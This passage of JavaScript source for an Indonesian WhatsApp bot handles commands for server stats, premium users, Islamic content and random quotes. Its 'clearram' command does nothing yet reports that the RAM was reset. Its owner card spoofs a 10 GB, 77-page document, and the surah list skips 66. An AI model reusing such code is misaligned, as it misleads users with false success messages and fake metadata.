						teks += `- *#${_cmd[u].nama} dipakai* ${_cmd[u].count} *kali*\n`
					}
					teks += `\n*乂 COMMAND USER*\n\n`
					for (let i = 0; i < jumlah; i++) {
						teks += `- *#${_cmdUser[posi].db[i].nama} dipakai* ${_cmdUser[posi].db[i].count} *kali*\n`
					}
					let datan = `https://quickchart.io/chart?bkg=white&c=%7B%0A%20%20type%3A%20%27bar%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20labels%3A%20%5B%27${_cmd[0].nama}%27%2C%20%27${_cmd[1].nama}%27%2C%20%27${_cmd[2].nama}%27%2C%20%27${_cmd[3].nama}%27%2C%20%27${_cmd[4].nama}%27%2C%20%27${_cmd[5].nama}%27%2C%20%27${_cmd[6].nama}%27%2C%20%27${_cmd[7].nama}%27%2C%20%27${_cmd[8].nama}%27%2C%20%27${_cmd[9].nama}%27%5D%2C%0A%20%20%20%20datasets%3A%20%5B%7B%0A%20%20%20%20%20%20label%3A%20%27Penggunaan%20Command%27%2C%0A%20%20%20%20%20%20data%3A%20%5B${_cmd[0].count}%2C%20${_cmd[1].count}%2C%20${_cmd[2].count}%2C%20${_cmd[3].count}%2C%20${_cmd[4].count}%2C%20${_cmd[5].count}%2C%20${_cmd[6].count}%2C%20${_cmd[7].count}%2C%20${_cmd[8].count}%2C%20${_cmd[9].count}%5D%0A%20%20%20%20%7D%5D%0A%20%20%7D%0A%7D`
					vreden.sendMessage(m.chat, {
						text: teks,
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: "WHATSAPP - BOT",
								body: 'Chat Pintar di WhatsApp.',
								thumbnailUrl: datan,
								sourceUrl: 'whatsapp.com',
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'owner':
			case 'creator': {
				let own = `*OWNER CONTACT*

Hai User
Ini Adalah Creator
Bot WhatsApp, Klik Disini
`
				let button = [{
					"name": "cta_url",
					"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
				}, {
					"name": "cta_url",
					"buttonParamsJson": `{\"display_text\":\"Information\",\"url\":\"${gcwa}\",\"merchant_url\":\"${gcwa}\"}`
				}]
				try {
					let buffer = await getBuffer("https://pomf2.lain.la/f/98ybk5u.jpg")
					vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail.jpg'),
						mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: buffer,
						fileName: `Developer Bot WhatsApp`,
					}, button, own, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'lopyu': {
				await vreden.sendMessage(m.chat, {
					audio: fs.readFileSync('./media/sound/lopyou.mp3'),
					mimetype: 'audio/mpeg',
					ptt: true
				}, {
					quoted: m
				})
			}
			break
			case 'cekdrive':
			case 'drive': {
				var result = await nou.drive.info();
				m.reply(`*Drive Server Info*\n\n - *Total :* ${result.totalGb} GB\n - *Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n - *Free :* ${result.freeGb} GB (${result.freePercentage}%)`)
			}
			break
			case 'cekbandwidth':
			case 'bandwidth': {
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				});
				try {
					var {
						download,
						upload
					} = await checkBandwidth();
					m.reply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekprem':
			case 'cekpremium': {
				if (!isPremium) return m.tolak(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
				if (isCreator) return m.tolak(`Khusus user aja bkn untuk owner`)
				try {
					let cekvip = ms(_prem.getPremiumExpired(m.sender) - Date.now())
					let teks = `*</> VIP USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Expired : ${cekvip.days}D
- Countdown :
${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit

*Benefit Info* :
- Download : 90MB++
- Limit : Unlimited
- Request : 10/s
- VIP Access : Yes
- User Priority : Yes
`
            		const contentText = {
            			text: teks,
            			contextInfo: {
            				mentionedJid: vreden.ments(teks),
            				externalAdReply: {
        					title: `PREMIUM USER 💳`,
        					previewType: "PHOTO",
        					thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
        					sourceUrl: setting.tiktok
            				}
            			}
            		};
            		return vreden.sendMessage(m.chat, contentText, {
                    			quoted: m,
                    		});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listpremium':
			case 'listprem': {
			let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
				try {
					let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
					let men = [];
					for (let i of premium) {
						men.push(i.id)
						txt += `*ID :* @${i.id.split("@")[0]}\n`
						if (i.expired === 'PERMANENT') {
							let cekvip = 'PERMANENT'
							txt += `*Expire :* PERMANENT\n\n`
						} else {
							let cekvip = ms(i.expired - Date.now())
							txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
						}
					}
					vreden.sendTextWithMentions(m.chat, txt, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listsewa': {
				let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
				let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
				let data_array = [];
				for (let x of sewa) {
					list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
					if (x.expired === 'PERMANENT') {
						let ceksewa = 'PERMANENT'
						list_sewa_list += `*Expire :* PERMANENT\n\n`
					} else {
						let ceksewa = ms(x.expired - Date.now())
						list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
					}
				}
				vreden.sendMessage(m.chat, {
					text: list_sewa_list
				}, {
					quoted: m
				})
			}
			break
			case "jadibot": {
				if (!isCreator && !isPremium) return m.tolak('Fitur khusus user premium!')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "✅",
						key: m.key,
					}
				})
				if (m.key.fromMe) return
				try {
					await jadibot(vreden, m, m.chat)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case "stopjadibot": {
				if (!isCreator && !isPremium) return m.tolak('Fitur khusus user premium!')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "✅",
						key: m.key,
					}
				})
				if (m.key.fromMe) return
				try {
					await stopjadibot(vreden, m.sender)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case "listjadibot": {
				if (!isCreator && !isPremium) return m.tolak('Fitur khusus user premium!')
				if (m.key.fromMe) return
				try {
					listjadibot(vreden, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'clearram': {
				var ramUsage = process.memoryUsage().rss
				clearInterval(ramUsage)
				m.reply(`Succes Me-reset Ram Server...`)
			}
			break
			case 'speed':
			case 'ping': {
				try {
					const used = process.memoryUsage();
					const cpus = os.cpus().map(cpu => {
						cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
						return cpu
					})
					const cpu = cpus.reduce((last, cpu, _, {
						length
					}) => {
						last.total += cpu.total
						last.speed += cpu.speed / length
						last.times.user += cpu.times.user
						last.times.nice += cpu.times.nice
						last.times.sys += cpu.times.sys
						last.times.idle += cpu.times.idle
						last.times.irq += cpu.times.irq
						return last
					}, {
						speed: 0,
						total: 0,
						times: {
							user: 0,
							nice: 0,
							sys: 0,
							idle: 0,
							irq: 0
						}
					})
					let tio = await nou.os.oos();
					var tot = await nou.drive.info();
					let respon = `*${pj}JARINGAN SERVER${pj}*
- Ping: ${latensi.toFixed(4)} _Second_ 

*${pj}INFO SERVER${pj}*
- OS: ${tio}
- IP Address: ${nou.os.ip()}
- Type OS: ${nou.os.type()}

*${pj}RAM :${pj}*
- Total: ${format(os.totalmem())}
- Digunakan: ${format(os.totalmem() - os.freemem())}

*${pj}PENYIMPANAN :${pj}*
- Total: ${tot.totalGb} GB
- Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
- Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*${pj}RUNTIME SERVER${pj}*
Aktif:
${runtime(os.uptime())}

*${pj}CPU USAGE (${cpus.length} CORE CPU)${pj}*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

> ${footxt}`.trim();
					let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20type%3A%20%27doughnut%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20datasets%3A%20%5B%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20data%3A%20%5B${tot.freePercentage}%2C%20${tot.usedPercentage}%5D%2C%0A%20%20%20%20%20%20%20%20backgroundColor%3A%20%5B%27%2326AC00%27%2C%20%27red%27%5D%2C%0A%20%20%20%20%20%20%20%20label%3A%20%27Dataset%201%27%2C%0A%20%20%20%20%20%20%20%20borderWidth%3A%200%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%5D%2C%0A%20%20%20%20labels%3A%20%5B%27A%27%2C%20%27C%27%5D%2C%0A%20%20%7D%2C%0A%20%20options%3A%20%7B%0A%20%20%20%20circumference%3A%20Math.PI%2C%0A%20%20%20%20rotation%3A%20Math.PI%2C%0A%20%20%20%20cutoutPercentage%3A%2075%2C%0A%20%20%20%20layout%3A%20%7B%0A%20%20%20%20%20%20padding%3A%2080%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20legend%3A%20%7B%0A%20%20%20%20%20%20display%3A%20false%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20plugins%3A%20%7B%0A%20%20%20%20%20%20datalabels%3A%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20%27%23404040%27%2C%0A%20%20%20%20%20%20%20%20anchor%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20align%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20formatter%3A%20(val)%20%3D%3E%20val%20%2B%20%27%25%27%2C%0A%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20doughnutlabel%3A%20%7B%0A%20%20%20%20%20%20%20%20labels%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5CnPing%20Status%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2020%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5Cn${latensi.toFixed(4)}s%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%27%23000%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%5D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%7D%2C%0A%20%20%7D%2C%0A%7D`
					vreden.sendMessage(m.chat, {
						text: respon,
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: ucapanWaktu,
								thumbnailUrl: imgso,
								sourceUrl: 'https://control.vreden.my.id/plans.html',
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ ISLAMIC ]━━━━━━━━━━━━━━━━━//
			case 'kisahnabi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Ketik nama Nabi\nContoh : ${prefix+command} Muhammad`)
				try {
					let tod = await fetchJson(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`) //perlu ganti
					const name = tod.name
					if (name === "Error") return m.reply("Ketik Nama Yang Valid")
					const ultah = tod.thn_kelahiran
					const umur = tod.usia
					const asal = tod.tmp
					const cerita = tod.description
					var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Umur : ${umur}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`
					m.reply(kisah)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'asmaulhusna': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let todi = await fetchJson(`https://www.vreden.my.id/cdn/islamic/AsmaulHusna.json`)
					const tod = await pickRandom(todi.result)
					const ke = tod.number
					const latin = tod.latin
					const arab = tod.arab
					const indo = tod.translate_id
					const english = tod.translate_en
					var asmaul = `_*Random Asmaul Husna*_
Asmaul Husna Ke : ${ke}
Teks Arab : ${arab}
Teks Latin : ${latin}
Translate Indonesia : ${indo}
Translate Inggris : ${english}`
					m.reply(asmaul)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'asmaulhusna2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let todi = await fetchJson(`https://www.vreden.my.id/cdn/islamic/AsmaulHusna.json`)
					const tod = todi.result[text - 1]
					const ke = tod.number
					const latin = tod.latin
					const arab = tod.arab
					const indo = tod.translate_id
					const english = tod.translate_en
					var asmaul = `_*Random Ke ${text}*_
Teks Arab : ${arab}
Teks Latin : ${latin}
Translate Indonesia : ${indo}
Translate Inggris : ${english}`
					m.reply(asmaul)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listsurah':
			case 'listsurat': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					var surah = `_*List Surah*_

1. Al Fatihah (Pembuka)
2. Al Baqarah (Sapi Betina)
3. Ali Imran (Keluarga Imran)
4. An Nisa (Wanita)
5. Al Ma'idah (Jamuan)
6. Al An'am (Hewan Ternak)
7. Al-A'raf (Tempat yang Tertinggi)
8. Al-Anfal (Harta Rampasan Perang)
9. At-Taubah(Pengampunan)
10. Yunus (Nabi Yunus)
11. Hud (Nabi Hud)
12. Yusuf (Nabi Yusu)
13. Ar-Ra'd (Guruh)
14. Ibrahim (Nabi Ibrahim)
15. Al-Hijr (Gunung Al Hijr)
16. An-Nahl (Lebah)
17. Al-Isra' (Perjalanan Malam)
18. Al-Kahf (Penghuni-penghuni Gua)
19. Maryam (Maryam)
20. Ta Ha (Ta Ha)
21. Al-Anbiya (Nabi-Nabi)
22. Al-Hajj (Haji)
23. Al-Mu'minun (Orang-orang mukmin)
24. An-Nur (Cahaya)
25. Al-Furqan (Pembeda)
26. Asy-Syu'ara' (Penyair)
27. An-Naml (Semut)
28. Al-Qasas (Kisah-kisah)
29. Al-'Ankabut (Laba-laba)
30. Ar-Rum (Bangsa Romawi)
31. Luqman (Keluarga Luqman)
32. As-Sajdah (Sajdah)
33. Al-Ahzab (Golongan-golongan yang Bersekutu)
34. Saba' (Kaum Saba')
35. Fatir (Pencipta)
36. Ya Sin (Yaasiin)
37. As-Saffat (Barisan-barisan)
38. Sad (Shaad)
39. Az-Zumar (Rombongan-rombongan)
40. Ghafir (Yang Mengampuni)
41. Fussilat (Yang Dijelaskan)
42. Asy-Syura (Musyawarah)
43. Az-Zukhruf (Perhiasan)
44. Ad-Dukhan (Kabut)
45. Al-Jasiyah (Yang Bertekuk Lutut)
46. Al-Ahqaf (Bukit-bukit Pasir)
47. Muhammad (Nabi Muhammad)
48. Al-Fath (Kemenangan)
49. Al-Hujurat (Kamar-kamar)
50. Qaf (Qaaf)
51. Az-Zariyat (Angin yang Menerbangkan)
52. At-Tur (Bukit)
53. An-Najm (Bintang)
54. Al-Qamar (Bulan)
55. Ar-Rahman (Yang Maha Pemurah)
56. Al-Waqi'ah (Hari Kiamat)
57. Al-Hadid (Besi)
58. Al-Mujadilah (Wanita yang Mengajukan Gugatan)
59. Al-Hasyr (Pengusiran)
60. Al-Mumtahanah (Wanita yang Diuji)
61. As-Saff (Satu Barisan)
62. Al-Jumu'ah (Hari Jum'at)
63. Al-Munafiqun (Orang-orang yang Munafik)
64. At-Tagabun (Hari Dinampakkan Kesalahan-kesalahan)
65. At-Talaq (Talak)
67. Al-Mulk (Kerajaan)
68. Al-Qalam (Pena)
69. Al-Haqqah (Hari Kiamat)
70. Al-Ma'arij (Tempat Naik)
71. Nuh (Nabi Nuh)
72. Al-Jinn (Jin)
73. Al-Muzzammil (Orang yang Berselimut)
74. Al-Muddassir (Orang yang Berkemul)
75. Al-Qiyamah (Kiamat)
76. Al-Insan (Manusia)
77. Al-Mursalat (Malaikat-Malaikat Yang Diutus)
78. An-Naba' (Berita Besar)
79. An-Nazi'at (Malaikat-Malaikat Yang Mencabut)
80. 'Abasa (Ia Bermuka Masam)
81. At-Takwir (Menggulung)
82. Al-Infitar (Terbelah)
83. Al-Tatfif (Orang-orang yang Curang)
84. Al-Insyiqaq (Terbelah)
85. Al-Buruj (Gugusan Bintang)
86. At-Tariq (Yang Datang di Malam Hari)
87. Al-A'la (Yang Paling Tinggi)
88. Al-Gasyiyah (Hari Pembalasan)
89. Al-Fajr (Fajar)
90. Al-Balad (Negeri)
91. Asy-Syams (Matahari)
92. Al-Lail (Malam)
93. Ad-Duha (Waktu Matahari Sepenggalahan Naik (Dhuha))
94. Al-Insyirah (Melapangkan)
95. At-Tin (Buah Tin)
96. Al-'Alaq (Segumpal Darah)
97. Al-Qadr (Kemuliaan)
98. Al-Bayyinah (Pembuktian)
99. Az-Zalzalah (Kegoncangan)
100. Al-'Adiyat (Berlari Kencang)
101. Al-Qari'ah (Hari Kiamat)
102. At-Takasur (Bermegah-megahan)
103. Al-'Asr (Masa)
104. Al-Humazah (Pengumpat)
105. Al-Fil (Gajah)
106. Quraisy (Suku Quraisy)
107. Al-Ma'un (Barang-barang yang Berguna)
108. Al-Kausar (Nikmat yang Berlimpah)
109. Al-Kafirun (Orang-orang Kafir)
110. An-Nasr (Pertolongan)
111. Al-Lahab (Gejolak Api)
112. Al-Ikhlas (Ikhlas)
113. Al-Falaq (Waktu Subuh)
114. An-Nas (Umat Manusia)

`
					m.reply(surah)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'randomquran': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let todi = await fetchJson(`https://www.vreden.my.id/cdn/islamic/quranaudio.json`)
					const tod = await pickRandom(todi)
					const arti = tod.asma.translation.id
					const audio = tod.audio
					const asma = tod.asma.ar.short
					const ayat = tod.ayatCount
					const keterangan = tod.tafsir
					const nama = tod.asma.id.short
					const nomor = tod.number
					const tempat = tod.type
					var quran = `*乂 RANDOM QURAN*

*Nama* : ${nama}
*Asma* : ${asma}
*Surat Ke* : ${nomor}
*Arti* : ${arti}
*Total Ayat* : ${ayat}
*Type* : ${tempat}
*Keterangan* : ${keterangan}\n\n_Loading Audio..._`
					await m.reply(quran)
					await vreden.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'jadwalsholat':
			case 'sholat': {
				if (!text) return m.warning(`Masukkan Wilayah-nya\nContoh : ${prefix+command} Semarang`)
				try {
					const iddae = await findKodeDaerah(text)
					const res = await jadwalSholat(iddae.kode_daerah)
					m.sendForward(`*乂 JADWAL - SHOLAT*\n\n${Object.entries(res).map(([name, data]) => `- *${name}* : ${data}`).join('\n').trim()}\n\n> ${footxt}`)
				} catch (error) {
					m.reply(`Masukan Daerah Yang Valid`)
				}
			}
			break
			case 'quranaudio':
			case 'alquranaudio': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Masukkan Suratnya\nContoh : ${prefix+command} 1\n\nKetik .listsurah Untuk Melihat Daftar Surat`)
				try {
					let todi = await fetchJson(`https://www.vreden.my.id/cdn/islamic/quranaudio.json`)
					const tod = await todi[text - 1]
					const arti = tod.asma.translation.id
					const audio = tod.audio
					const asma = tod.asma.ar.short
					const ayat = tod.ayatCount
					const keterangan = tod.tafsir
					const nama = tod.asma.id.short
					const nomor = tod.number
					const tempat = tod.type
					var quran = `*乂 QURAN AUDIO*

*Nama* : ${nama}
*Asma* : ${asma}
*Surat Ke* : ${nomor}
*Arti* : ${arti}
*Total Ayat* : ${ayat}
*Type* : ${tempat}
*Keterangan* : ${keterangan}\n\n_Loading Audio..._`
					await m.reply(quran)
					await vreden.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ RANDOM ]━━━━━━━━━━━━━━━━━//
			case 'bucin':
			case 'quotesbucin': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const bucin = await fetchJson(`https://www.vreden.my.id/cdn/random/bucin.json`)
					const bucc = await pickRandom(bucin)
					vreden.sendMessage(m.chat, {
						text: bucc
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'dilan':
			case 'quotesdilan': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let tod = await fetchJson(`https://www.vreden.my.id/cdn/game/quotesdilan.json`)
					const dilan = await pickRandom(tod)
					vreden.sendMessage(m.chat, {
						text: dilan.quotes
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'quotesanime': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const quotesanim = await fetchJson(`https://www.vreden.my.id/cdn/random/quotesanime.json`)
					const anu = await pickRandom(quotesanim)
					let cap = `*Quotes Anime🥶*\n\n"${anu.quotes}"\n\n*${anu.char_name}*\n_${anu.anime} (${anu.episode})_\n_${anu.date}_`

					function toUsername(str) {
						return str.toLowerCase().replace(/\s+/g, '');
					}
					let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Url Quotes\",\"url\":\"${anu.url}\",\"merchant_url\":\"${anu.url}\"}`
					}]
					await vreden.sendButtonImage(m.chat, {
						url: `https://api.vreden.my.id/api/tweet?theme=dark&username=${toUsername(anu.char_name)}&displayname=${encodeURIComponent(anu.char_name)}&comment=${encodeURIComponent(anu.quotes)}&avatar=${encodeURIComponent(anu.img)}`
					}, button, cap, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'galau': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const galau = await fetchJson(`https://www.vreden.my.id/cdn/random/katagalau.json`)
					const galaunya = await pickRandom(galau)
					m.reply(`${galaunya}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katabijak': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const bijak = await fetchJson(`https://www.vreden.my.id/cdn/random/katabijak.json`)
					const katabijak = await pickRandom(bijak)
					m.reply(`${katabijak}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katacinta': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const cinta = await fetchJson(`https://www.vreden.my.id/cdn/random/katacinta.json`)
					const katacinta = await pickRandom(cinta)
					m.reply(`${katacinta}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katahacker': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const hacker = await fetchJson(`https://www.vreden.my.id/cdn/random/katahacker.json`)
					const katahacker = await pickRandom(hacker)
					m.reply(`${katahacker}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katasindiran': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const sindiran = await fetchJson(`https://www.vreden.my.id/cdn/random/katasindiran.json`)
					const katasindiran = await pickRandom(sindiran)
					m.reply(`${katasindiran}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekkodam':
			case 'cekkhodam': {
				if (!text) return m.reply("mana nama mu yang mo di cek??🗿🥸")
				try {
					const khodam = await fetchJson(`https://www.vreden.my.id/cdn/random/khodam.json`)
					const khodamu = await pickRandom(khodam)
					const katakodam = await pickRandom(["awiokwoik 🤣 🗿 🐦", "brakakakak khodam mu apaan kek gitu :v", "😂😂bu mega ketawa melihat ini", "😞ututututu kaciann", "😨ati atii cokk khodam nya ngeri", "ishh ishhh memalukann🗿", "sekopsekopsekop😂", "pengen dosa takut ketawa😂🗿", "sehat sehat yakk adick adick😂🐦", "ututututu🤣🗿"])
					bales(`Khodam ${text} adalah *${khodamu}*\n\n${katakodam}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'quotesislamic': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const islamic = await fetchJson(`https://www.vreden.my.id/cdn/random/quotesislamic.json`)
					const quotesislamic = await pickRandom(islamic)
					m.reply(`${quotesislamic}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'faktaunik': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const fakta = await fetchJson(`https://www.vreden.my.id/cdn/random/faktaunix.json`)
					const faktaunik = await pickRandom(fakta)
					m.reply(`*Taukah Kamu?*\n\n${faktaunik}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katasenja': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const senja = await fetchJson(`https://www.vreden.my.id/cdn/random/katasenja.json`)
					const katasenja = await pickRandom(senja)
					m.reply(`${katasenja}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'katailham': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const ilham = await fetchJson(`https://www.vreden.my.id/cdn/random/katailham.json`)
					const katailham = await pickRandom(ilham)
					m.reply(`${katailham}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ceritahoror': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const horor = await fetchJson(`https://www.vreden.my.id/cdn/random/ceritahoror.json`)
					const ceritahoror = await pickRandom(horor)
					await vreden.sendMessage(m.chat, {
						text: `*${ceritahoror.judul}*\n\nDesk:\n${ceritahoror.desc}\n\nStory:\n${ceritahoror.story}`,
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: ceritahoror.judul,
								body: 'WhatsApp Bot Cerpen',
								thumbnailUrl: ceritahoror.thumb,
								sourceUrl: tiktok,
								mediaType: 1,
								renderLargerThumbnail: true
							}
